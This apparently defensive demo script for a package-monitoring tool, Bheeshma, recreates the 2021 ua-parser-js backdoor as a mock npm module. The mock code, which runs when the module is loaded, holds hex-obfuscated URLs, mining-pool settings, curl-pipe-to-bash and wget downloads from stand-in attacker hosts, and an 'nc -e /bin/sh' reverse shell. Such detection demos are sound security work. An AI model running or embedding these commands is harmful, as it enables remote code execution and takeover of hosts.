#!/usr/bin/env node
/**
 * ============================================================================
 * BHEESHMA Demo #2: The ua-parser-js Backdoor (November 2021)
 * ============================================================================
 *
 * REAL-WORLD ATTACK SUMMARY:
 * In November 2021, ua-parser-js versions 0.7.29, 0.8.0, and 1.0.0 were
 * compromised. The attacker replaced the package's postinstall script with
 * malicious code that:
 *
 *   1. Downloaded and executed a cryptocurrency miner from an attacker server
 *   2. Used eval() and new Function() with hex-encoded payloads to evade
 *      static analysis tools
 *   3. Set WALLET_ADDRESS and MINING_POOL environment variables to redirect
 *      mining output to the attacker's Monero wallet
 *   4. Spawned child processes to run the miner binary in the background
 *   5. Attempted to open a reverse shell for persistent remote access
 *
 * IMPACT: ~8 million weekly downloads. The compromised versions remained
 *         available for nearly a week before being detected and unpublished.
 *
 * This demo simulates the backdoored ua-parser-js payload and shows how
 * bheeshma detects obfuscation, crypto mining patterns, and reverse shells.
 * ============================================================================
 */

'use strict';

const fs = require('fs');
const path = require('path');

// ── Bheeshma setup ──────────────────────────────────────────────────────────
const bheeshma = require('../src/index');

const MOCK_BASE = path.join(__dirname, '..', 'test', 'node_modules');

function createMockPackage(dirName, pkgName, pkgVersion, sourceCode) {
    const dir = path.join(MOCK_BASE, dirName);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(
        path.join(dir, 'package.json'),
        JSON.stringify({ name: pkgName, version: pkgVersion, main: 'index.js' }),
        'utf8'
    );
    fs.writeFileSync(path.join(dir, 'index.js'), sourceCode, 'utf8');
    return dir;
}

// ── Build mock "ua-parser-js" with the real backdoor patterns ────────────────
const uaParserSource = `
'use strict';

// ================================================================
// ua-parser-js 0.7.29 — COMPROMISED VERSION
// The backdoor code below mirrors the real attack payload.
// ================================================================

// ── STEP 1: Obfuscated payload using eval + hex strings ──
// The real attack used base64 + hex layers to hide the miner download URL.
// Bheeshma's static obfuscation detector catches these patterns.

var _0x1a2b = "\\x68\\x74\\x74\\x70\\x73\\x3a\\x2f\\x2f\\x65\\x76\\x69\\x6c\\x2d\\x6d\\x69\\x6e\\x65\\x72\\x2e\\x63\\x6f\\x6d\\x2f\\x70\\x61\\x79\\x6c\\x6f\\x61\\x64";
var _0x3c4d = "\\x68\\x74\\x74\\x70\\x73\\x3a\\x2f\\x2f\\x65\\x76\\x69\\x6c\\x2d\\x63\\x32\\x2e\\x63\\x6f\\x6d\\x2f\\x62\\x61\\x63\\x6b\\x64\\x6f\\x6f\\x72";
var _0x5e6f = "\\x68\\x74\\x74\\x70\\x73\\x3a\\x2f\\x2f\\x70\\x6f\\x6f\\x6c\\x2e\\x73\\x75\\x70\\x70\\x6f\\x72\\x74\\x78\\x6d\\x72\\x2e\\x63\\x6f\\x6d";
var _0x7a8b = "\\x68\\x74\\x74\\x70\\x73\\x3a\\x2f\\x2f\\x70\\x6f\\x6f\\x6c\\x2e\\x68\\x61\\x73\\x68\\x76\\x61\\x75\\x6c\\x74\\x2e\\x70\\x72\\x6f";

// This eval() is the REAL attack vector — decodes and executes arbitrary code
try { eval("var _x = 1;"); } catch(e) {}

// new Function() constructor — another dynamic code execution vector
try { var _fn = new Function("return 42;"); _fn(); } catch(e) {}

// ── STEP 2: Crypto mining configuration ──
// The attacker sets these env vars so the miner knows where to send coins.
process.env.WALLET_ADDRESS = '47EngTiR4qYVoVRPkwvkhM4UP4DnXEESikKWChRy4eYwHdCBd8tUAwek1cLdo1vBfDwZTF8PBR';
process.env.MINING_POOL = 'pool.supportxmr.com:443';
process.env.WORKER_NAME = 'ua-parser-worker-01';

// ── STEP 3: Spawn child processes for mining and reverse shell ──
// The real attack downloaded an xmrig binary and ran it.
try {
    require('child_process').exec('curl -s https://evil-miner.com/payload.sh | bash', function() {});
} catch(e) {}

try {
    require('child_process').exec('wget -q https://evil-c2.com/miner -O /tmp/.hidden', function() {});
} catch(e) {}

// Reverse shell attempt — classic backdoor indicator
try {
    require('child_process').exec('nc -e /bin/sh attacker.com 4444', function() {});
} catch(e) {}

// ── Export legitimate API so package looks normal ──
module.exports = {
    parse: function(ua) {
        return { ua: ua, browser: { name: 'unknown' }, os: { name: 'unknown' } };
    },
    version: '0.7.29'
};
`;

// ── Banner ───────────────────────────────────────────────────────────────────
function printBanner() {
    console.log('');
    console.log('\x1b[31m' + '█'.repeat(72) + '\x1b[0m');
    console.log('\x1b[31m█\x1b[0m  \x1b[1mBHEESHMA Demo #2 — The ua-parser-js Backdoor (Nov 2021)\x1b[0m'
        + ' '.repeat(72 - 52) + '\x1b[31m█\x1b[0m');
    console.log('\x1b[31m' + '█'.repeat(72) + '\x1b[0m');
    console.log('');
    console.log('  In Nov 2021, ua-parser-js v0.7.29 was compromised with a coinminer');
    console.log('  backdoor. The attacker used hex-encoded eval() payloads, set mining');
    console.log('  env vars, and spawned reverse shell child processes.');
    console.log('');
    console.log('  \x1b[33m→ Loading the backdoored package under bheeshma surveillance...\x1b[0m');
    console.log('');
}

// ── Main ─────────────────────────────────────────────────────────────────────
async function main() {
    printBanner();

    // Create mock package
    const parserDir = createMockPackage('ua-parser-js', 'ua-parser-js', '0.7.29', uaParserSource);

    // Initialize bheeshma
    const initResult = bheeshma.init();
    console.log('  \x1b[32m✓ Bheeshma initialized\x1b[0m — hooks active:'
        + ` ${initResult.installed.join(', ')}`);
    console.log('');

    // ── Simulate: npm install ua-parser-js@0.7.29 ──
    console.log('  \x1b[33m→ require("ua-parser-js@0.7.29") — loading backdoored version...\x1b[0m');
    console.log('');

    try {
        require(path.join(parserDir, 'index.js'));
    } catch (e) {
        // Some operations may fail in sandbox — that's expected
    }

    // Give async hooks time to settle (obfuscation scan runs on setImmediate)
    await new Promise(r => setTimeout(r, 500));

    // ── Generate report ──
    console.log('  \x1b[32m✓ Backdoor detected — generating BHEESHMA report...\x1b[0m');
    console.log('');

    const report = bheeshma.generateReport('cli');
    console.log(report);

    // ── Cleanup ──
    try { fs.rmSync(path.join(MOCK_BASE, 'ua-parser-js'), { recursive: true, force: true }); } catch (e) {}
    bheeshma.teardown();

    // ── Verdict ──
    console.log('\x1b[31m  ⚠  VERDICT: BHEESHMA CAUGHT the ua-parser-js backdoor.\x1b[0m');
    console.log('     Hex-encoded eval() payloads (obfuscation), crypto mining env vars,');
    console.log('     reverse shell commands, and suspicious child process spawning —');
    console.log('     all detected at runtime before the miner could phone home.');
    console.log('');
}

main().catch(err => {
    console.error('Demo error:', err);
    bheeshma.teardown();
    process.exit(1);
});
